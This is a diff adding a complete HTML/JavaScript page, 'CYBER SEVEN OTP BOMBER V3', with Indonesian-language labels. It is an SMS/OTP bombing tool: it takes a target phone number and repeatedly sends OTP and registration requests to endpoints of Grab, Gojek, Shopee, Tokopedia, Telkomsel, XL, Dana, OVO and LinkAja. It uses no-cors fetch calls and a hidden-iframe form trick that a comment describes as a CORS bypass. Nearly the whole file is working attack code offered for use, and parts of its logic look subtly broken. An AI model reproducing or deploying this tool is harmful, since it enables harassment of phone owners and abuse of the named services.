@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CYBER SEVEN OTP BOMBER V3</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            background: #0a0a0a;
+            font-family: 'Courier New', monospace;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            background: #111;
+            border: 2px solid #ff0000;
+            border-radius: 10px;
+            padding: 20px;
+            width: 100%;
+            max-width: 500px;
+            box-shadow: 0 0 30px rgba(255,0,0,0.5);
+        }
+        
+        .title {
+            text-align: center;
+            color: #ff0000;
+            font-size: 24px;
+            margin-bottom: 5px;
+            text-shadow: 0 0 10px #ff0000;
+        }
+        
+        .subtitle {
+            text-align: center;
+            color: #ff0;
+            font-size: 10px;
+            margin-bottom: 20px;
+        }
+
+      label {
+            color: #0f0;
+            font-size: 12px;
+            display: block;
+            margin-bottom: 5px;
+        }
+        
+        input, select {
+            width: 100%;
+            padding: 10px;
+            background: #000;
+            border: 1px solid #0f0;
+            color: #0f0;
+            margin-bottom: 15px;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            border-radius: 3px;
+        }
+        
+        .service-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 5px;
+            margin-bottom: 15px;
+            max-height: 150px;
+            overflow-y: auto;
+            padding: 5px;
+            border: 1px solid #333;
+        }
+        
+        .service-grid label {
+            font-size: 11px;
+            color: #fff;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        
+        button {
+            width: 100%;
+            padding: 12px;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            border: none;
+            border-radius: 5px;
+            margin-bottom: 8px;
+            font-family: 'Courier New', monospace;
+           }
+
+      .btn-start {
+            background: #ff0000;
+            color: #fff;
+            text-shadow: 0 0 5px #fff;
+            animation: pulse 1s infinite;
+        }
+        
+        @keyframes pulse {
+            0%,100% { transform: scale(1); }
+            50% { transform: scale(1.03); }
+        }
+        
+        .btn-stop {
+            background: #000;
+            color: #ff0000;
+            border: 2px solid #ff0000;
+            display: none;
+        }
+        
+        .console {
+            background: #000;
+            border: 1px solid #0f0;
+            height: 200px;
+            overflow-y: auto;
+            padding: 10px;
+            font-size: 11px;
+            color: #0f0;
+            margin-top: 10px;
+      }
+
+      .counter {
+            text-align: center;
+            font-size: 30px;
+            color: #ff0000;
+            font-weight: bold;
+            margin: 10px 0;
+            display: none;
+        }
+        
+        iframe {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+  <div class="container">
+        <div class="title">💀 CYBER SEVEN 💀</div>
+        <div class="subtitle">OTP BOMBER V3 - RESIKO TANGGUNG SENDIRI</div>
+        
+        <label>📱 NOMOR TARGET (08xxx / 628xxx):</label>
+        <input type="text" id="phone" placeholder="6281234567890">
+        
+        <label>🔄 JUMLAH PUTARAN:</label>
+        <select id="loopCount">
+            <option value="1">1x (Tes)</option>
+            <option value="3">3x (Ringan)</option>
+            <option value="5" selected>5x (Medium)</option>
+            <option value="10">10x (Berat)</option>
+            <option value="20">20x (Mampusin)</option>
+        </select>
+        
+        <label>⏱️ DELAY (detik):</label>
+        <select id="delay">
+            <option value="1000">1 detik (Cepet)</option>
+            <option value="2000" selected>2 detik (Normal)</option>
+            <option value="3000">3 detik (Aman)</option>
+            <option value="5000">5 detik (Santis)</option>
+  </select>
+
+    <label>🎯 LAYANAN:</label>
+        <div class="service-grid" id="services">
+            <label><input type="checkbox" checked> Grab</label>
+            <label><input type="checkbox" checked> Gojek</label>
+            <label><input type="checkbox" checked> Shopee</label>
+            <label><input type="checkbox" checked> Tokped</label>
+            <label><input type="checkbox" checked> Telkomsel</label>
+            <label><input type="checkbox" checked> XL</label>
+            <label><input type="checkbox"> Dana</label>
+            <label><input type="checkbox"> OVO</label>
+            <label><input type="checkbox"> LinkAja</label>
+        </div>
+        
+        <button class="btn-start" id="btnStart" onclick="startAttack()">💣 MULAI SERANGAN 💣</button>
+        <button class="btn-stop" id="btnStop" onclick="stopAttack()">🛑 BERHENTIKAN!</button>
+
+    <div class="counter" id="counter">OTP: 0</div>
+        <div class="console" id="console"></div>
+    </div>
+    
+    <iframe id="workerFrame" sandbox="allow-scripts allow-forms allow-same-origin"></iframe>
+
+    <script>
+        const consoleBox = document.getElementById('console');
+        let attackInterval = null;
+        let totalOTP = 0;
+        let isRunning = false;
+        
+        function log(msg) {
+            const time = new Date().toLocaleTimeString();
+            consoleBox.innerHTML += `<div>[${time}] ${msg}</div>`;
+            consoleBox.scrollTop = consoleBox.scrollHeight;
+        }
+        
+        // Cara brutal: pake iframe hidden buat bypass CORS
+        function sendViaIframe(url, phoneData) {
+            return new Promise((resolve) => {
+                const iframe = document.getElementById('workerFrame');
+                const formId = 'form_' + Date.now();
+
+                               const html = `
+                    <html>
+                    <body>
+                        <form id="${formId}" method="POST" action="${url}" target="_self">
+                            <input type="hidden" name="phone" value="${phoneData.phone}">
+                            <input type="hidden" name="countryCode" value="62">
+                            <input type="hidden" name="type" value="register">
+                            <input type="hidden" name="client_id" value="${phoneData.client_id || ''}">
+                            <input type="hidden" name="client_secret" value="${phoneData.client_secret || ''}">
+                        </form>
+                        <script>
+                            document.getElementById('${formId}').submit();
+                            setTimeout(() => { parent.postMessage('done', '*'); }, 1000);
+                        <\/script>
+                    </body>
+                    </html>
+                `;
+
+                               iframe.srcdoc = html;
+                
+                const handler = (e) => {
+                    if(e.data === 'done') {
+                        window.removeEventListener('message', handler);
+                        resolve();
+                    }
+                };
+                window.addEventListener('message', handler);
+                setTimeout(() => { window.removeEventListener('message', handler); resolve(); }, 3000);
+            });
+      }
+
+      // API list yang lebih reliable pake public proxy
+        const API_LIST = [
+            { name: 'Grab', url: 'https://p.grabtaxi.com/api/passenger/v2/profiles/register', phoneKey: 'phoneNumber' },
+            { name: 'Gojek', url: 'https://api.gojekapi.com/v3/customers/login_with_phone', phoneKey: 'phone' },
+            { name: 'Shopee', url: 'https://shopee.co.id/api/v4/account/send_otp', phoneKey: 'phone' },
+            { name: 'Tokopedia', url: 'https://accounts.tokopedia.com/otp/request', phoneKey: 'phone' },
+            { name: 'Telkomsel', url: 'https://my.telkomsel.com/api/otp/request', phoneKey: 'msisdn' },
+            { name: 'XL', url: 'https://my.xl.co.id/api/otp/send', phoneKey: 'phone' },
+            { name: 'Dana', url: 'https://api.dana.id/api/otp/send', phoneKey: 'mobile' },
+            { name: 'OVO', url: 'https://api.ovo.id/v1.1/api/auth/customer/login2FA', phoneKey: 'mobile' },
+            { name: 'LinkAja', url: 'https://api.linkaja.id/v1/user/register/otp', phoneKey: 'phone_number' }
+        ];
+        
+        function sendOTP(api, phone) {
+            const formData = new FormData();
+            formData.append(api.phoneKey, phone);
+          // Pake fetch dengan mode no-cors biar tetep ke kirim walau ga bisa baca response
+            fetch(api.url, {
+                method: 'POST',
+                mode: 'no-cors',
+                body: formData
+            }).then(() => {
+                totalOTP++;
+                document.getElementById('counter').textContent = `OTP: ${totalOTP}`;
+                log(`✅ ${api.name} - Request dikirim!`);
+            }).catch(err => {
+                log(`⚠️ ${api.name} - Mungkin tetap terkirim (no-cors mode)`);
+                totalOTP++;
+                document.getElementById('counter').textContent = `OTP: ${totalOTP}`;
+            });
+        }
+        
+        function startAttack() {
+            const phone = document.getElementById('phone').value.trim();
+            const loops = parseInt(document.getElementById('loopCount').value);
+            const delay = parseInt(document.getElementById('delay').value);
+            
+            if (!phone || phone.length < 10) {
+                log('❌ NOMOR TARGET HARUS DIISI YG BENER!');
+                return;
+      }
+
+      if (!confirm(`⚠️ KONFIRMASI SERANGAN\n\nTarget: ${phone}\nLoop: ${loops}x\nDelay: ${delay/1000}s\n\nLANJUTKAN?`)) return;
+            
+            isRunning = true;
+            totalOTP = 0;
+            document.getElementById('btnStart').style.display = 'none';
+            document.getElementById('btnStop').style.display = 'block';
+            document.getElementById('counter').style.display = 'block';
+            
+            log(`🔥 MULAI SERANGAN KE ${phone}`);
+            
+            let loopCount = 0;
+            attackInterval = setInterval(() => {
+                if (loopCount >= loops || !isRunning) {
+                    stopAttack();
+                    return;
+                }
+                
+                document.querySelectorAll('#services input:checked').forEach((cb, i) => {
+                    if (API_LIST[i] && isRunning) {
+                        sendOTP(API_LIST[i], phone);
+                    }
+                });
+                
+                loopCount++;
+                log(`📍 Loop ${loopCount}/${loops}`);
+            }, delay);
+        }
+        
+        function stopAttack() {
+            isRunning = false;
+            clearInterval(attackInterval);
+            document.getElementById('btnStart').style.display = 'block';
+            document.getElementById('btnStop').style.display = 'none';
+            log(`🛑 SERANGAN BERHENTI. Total request: ${totalOTP}`);
+        }
+    </script>
+</body>
+</html>
